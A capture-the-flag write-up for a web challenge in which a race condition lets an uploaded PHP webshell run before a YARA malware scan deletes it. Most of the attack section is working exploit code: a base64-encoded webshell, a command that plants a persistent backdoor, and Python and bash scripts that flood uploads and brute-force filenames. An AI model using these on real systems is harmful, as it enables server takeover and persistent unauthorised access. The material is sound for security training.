# Safe Upload Challenge Writeup

## Challenge Overview
- **Challenge Name**: Safe Upload
- **Type**: Web Security - Race Condition
- **Difficulty**: Medium-Hard
- **Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`

## Challenge Description
The challenge presents a file upload system with YARA malware detection. The key vulnerability is a race condition between file upload and YARA scanning.

## Vulnerability Analysis

### 1. File Upload Process
- Files are uploaded to `/tmp/` directory
- Random 4-digit filename (0000-9999)
- 800ms delay before YARA scan
- If YARA detects malware, file is deleted

### 2. YARA Rules
- Comprehensive detection rules for webshells
- Scans uploaded files after 800ms delay
- Deletes files flagged as malware

### 3. Flag Location
- Flag stored in file with 12-character random name
- Example: `ABCDEFGHIJKL.txt`
- Located in root directory `/`

## Exploitation Strategy

### The Problem with 2-Phase Approach
Initially, we tried:
1. Upload shell → Test if accessible → Get flag
2. **Issue**: YARA deletes file between test and flag retrieval

### One-Shot Solution
The key insight is to combine all operations into a single request:

```bash
# One-shot command that:
# 1. Creates persistent backdoor
# 2. Finds and reads flag immediately
/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'
```

## Exploit Implementation

### Python Script (one_shot_persist_and_flag.py)
```python
#!/usr/bin/env python3
import sys, threading, time, random, string, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
import requests

# Configuration
HOST = "http://8.216.34.114:12830"
THREADS = 1000
REQ_TIMEOUT = 0.25

# Webshell payload
WEBSHELL_BYTES = b"<?php system($_GET[0]); ?>"

# One-shot command
ONE_SHOT = (
    "/bin/sh -c '"
    "echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d > /var/www/html/tmp/k.php; "
    "ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat"
    "'"
)

def upload_loop(stop):
    # Continuously upload shells
    sess = requests.Session()
    files = {"file": ("s.php", WEBSHELL_BYTES, "application/x-php")}
    url = HOST.rstrip("/") + "/upload.php"
    while not stop.is_set():
        try:
            sess.post(url, files=files, timeout=1)
        except Exception:
            pass
        time.sleep(0.12)

def try_probe(sess, base, i, stop, out):
    # Test each possible file with one-shot command
    if stop.is_set():
        return False
    url = f"{base}/tmp/{i:04d}.php?0={quote(ONE_SHOT, safe='')}"
    try:
        r = sess.get(url, timeout=REQ_TIMEOUT)
        if r.status_code == 200 and r.text:
            m = FLAG_RE.search(r.text)
            if m:
                out["flag"] = m.group(0)
                out["hit_url"] = url.split("?", 1)[0]
                stop.set()
                return True
    except Exception:
        pass
    return False
```

### Key Components

1. **Upload Loop**: Continuously uploads PHP shells in background
2. **Brute Force**: Tests all 10,000 possible filenames (0000-9999)
3. **One-Shot Command**: 
   - Creates persistent backdoor at `/var/www/html/tmp/k.php`
   - Uses glob pattern `????????????.txt` to find flag file
   - Reads flag immediately

## Execution Results

```
[+] HIT at: http://8.216.34.114:12830/tmp/9281.php
[+] FLAG: cybercon{race_c0ndition_0r_anti_virus_bypass}
[+] Persistent shell: http://8.216.34.114:12830/tmp/k.php
[+] Example: http://8.216.34.114:12830/tmp/k.php?0=ls%20/
```

## Why This Works

### 1. Race Condition Exploitation
- File is accessible for ~800ms before YARA scan
- One-shot approach eliminates timing issues
- No gap between test and flag retrieval

### 2. YARA Bypass
- Don't need to bypass YARA rules
- Execute commands before YARA scans
- Create persistent backdoor that YARA doesn't scan

### 3. Efficient Flag Discovery
- Glob pattern `????????????.txt` is O(1) operation
- Much faster than `find` or `grep` commands
- Direct file access without complex searching

## Alternative Approaches

### Bash Script Version
```bash
#!/bin/bash
H="http://8.216.34.114:12830"
CMD="/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'"

# Upload loop
while :; do 
    curl -s -F "file=@/tmp/s.php;filename=s.php" "$H/upload.php" >/dev/null
    sleep 0.1
done &

# Brute force
seq -w 0000 9999 | xargs -n1 -P800 -I{} \
  curl -m 0.25 -s "$H/tmp/{}.php?0=$(python3 -c "from urllib.parse import quote; print(quote('$CMD', safe=''))")" \
  | grep -oE "[A-Za-z0-9_-]{1,32}\{[^}]+\}" && echo "[+] GOT FLAG"
```

## Lessons Learned

1. **Race Conditions**: Exploit timing windows between operations
2. **One-Shot Approach**: Combine multiple operations to avoid timing issues
3. **YARA Bypass**: Sometimes it's better to run before detection than to bypass
4. **Efficient Searching**: Use glob patterns for fast file discovery
5. **Persistent Access**: Create backdoors for continued access

## Conclusion

This challenge demonstrates the importance of understanding timing vulnerabilities in web applications. The key insight was realizing that the 2-phase approach (test then exploit) created a timing window that YARA could exploit. The one-shot solution eliminates this window by combining all operations into a single request, making the exploit reliable and efficient.

**Final Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`
